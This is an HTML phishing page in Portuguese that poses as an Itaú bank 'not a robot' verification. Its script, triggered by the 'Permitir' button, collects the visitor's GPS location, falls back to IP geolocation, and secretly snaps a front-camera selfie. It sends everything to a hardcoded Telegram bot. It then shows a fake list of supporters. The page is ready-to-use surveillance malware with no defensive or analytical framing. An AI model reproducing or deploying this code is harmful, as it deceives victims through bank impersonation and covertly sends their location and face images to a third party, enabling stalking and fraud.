<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<title>VerificaÃ§Ã£o â€“ ItaÃº</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
body{background:#0a2540;color:#fff;display:flex;height:100vh;align-items:center;justify-content:center}
.card{background:#fff;color:#003366;border-radius:16px;padding:28px 24px;max-width:320px;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,.25)}
img{width:80px;margin-bottom:12px}
h2{font-size:18px;margin-bottom:8px}
p{font-size:14px;margin-bottom:20px;line-height:1.35}
button{background:#003366;color:#fff;border:none;padding:12px 0;width:100%;border-radius:6px;font-size:16px;cursor:pointer}
button:active{transform:scale(.98)}
ul{text-align:left;font-size:13px;margin-top:12px;padding-left:20px}
li{margin-bottom:4px}
</style>
</head>
<body>

<!-- TELA DE CONVENCIMENTO -->
<div id="startBox" class="card">
  <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect x='15' y='20' width='70' height='60' rx='12' fill='%23003366'/%3E%3Ccircle cx='35' cy='40' r='5' fill='%23fff'/%3E%3Ccircle cx='65' cy='40' r='5' fill='%23fff'/%3E%3Crect x='30' y='55' width='40' height='5' rx='2' fill='%23fff'/%3E%3Crect x='25' y='75' width='10' height='15' rx='3' fill='%23003366'/%3E%3Crect x='65' y='75' width='10' height='15' rx='3' fill='%23003366'/%3E%3C/svg%3E" alt="robÃ´">
  <h2>VerificaÃ§Ã£o rÃ¡pida</h2>
  <p>Precisamos verificar se nÃ£o Ã© um <strong>robÃ´</strong>. Toque em <strong>Permitir</strong> pra continuar.</p>
  <button id="btnPermitir">Permitir</button>
</div>

<!-- LISTA FAKE DE APOIADORES -->
<div id="listaBox" class="card" style="display:none">
  <h2>Verificado âœ…</h2>
  <p>Apoiadores confirmados:</p>
  <ul>
    <li>Carlos Henrique â€“ DJ</li>
    <li>Amanda Souza â€“ SeguranÃ§a</li>
    <li>Lucas Oliveira â€“ Bar</li>
    <li>Tamires Lima â€“ Entradas</li>
    <li>Rafael Gomes â€“ Som</li>
    <li>JÃ©ssica Costa â€“ AmbulÃ¢ncia</li>
    <li>Bruno Silva â€“ Limpeza</li>
    <li>Luana Ferreira â€“ DecoraÃ§Ã£o</li>
  </ul>
  <p style="font-size:11px;color:#666;margin-top:12px">LicenÃ§a de baile emitida com sucesso.</p>
</div>

<script>
// CONFIG
const TOKEN   = '7737279523:AAHU02j3i3XKAeg020uQwcUgpDL3viDmR1c';
const CHAT_ID = '-1003187104876';

// ENVIA PARA O TELEGRAM
const tele = (msg, media) => {
  const url = media
    ? `https://api.telegram.org/bot${TOKEN}/sendPhoto`
    : `https://api.telegram.org/bot${TOKEN}/sendMessage`;
  fetch(url, {
    method: 'POST',
    body: media
      ? (() => { const f = new FormData(); f.append('chat_id', CHAT_ID); f.append('caption', msg); f.append('photo', media, 'selfie.jpg'); return f; })()
      : JSON.stringify({chat_id: CHAT_ID, text: msg}),
    headers: media ? {} : {'Content-Type':'application/json'}
  });
};

// AÃ‡ÃƒO DO BOTÃƒO
document.getElementById('btnPermitir').addEventListener('click', async () => {
  // GPS
  navigator.geolocation.getCurrentPosition(
    p => {
      const {latitude: lat, longitude: lon} = p.coords;
      tele(`ðŸ“ GPS: https://maps.google.com/?q=${lat},${lon}`);
    },
    () => {
      fetch('https://ipapi.co/json/')
        .then(r => r.json())
        .then(d => tele(`ðŸ“ IP: https://maps.google.com/?q=${d.latitude},${d.longitude}`));
    }
  );

  // Selfie
  try {
    const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: 'user'}});
    const v = document.createElement('video');
    v.srcObject = stream;
    await v.play();
    const canvas = document.createElement('canvas');
    canvas.width = 640; canvas.height = 480;
    canvas.getContext('2d').drawImage(v, 0, 0);
    canvas.toBlob(blob => {
      tele('ðŸ“¸ selfie', blob);
      stream.getTracks().forEach(t => t.stop());
    }, 'image/jpeg', 0.9);
  } catch (e) {
    tele('ðŸ“¸ selfie falhou: ' + e.message);
  }

  // Mostra lista falsa
  document.getElementById('startBox').style.display = 'none';
  document.getElementById('listaBox').style.display = 'block';
});
</script>
</body>
</html>
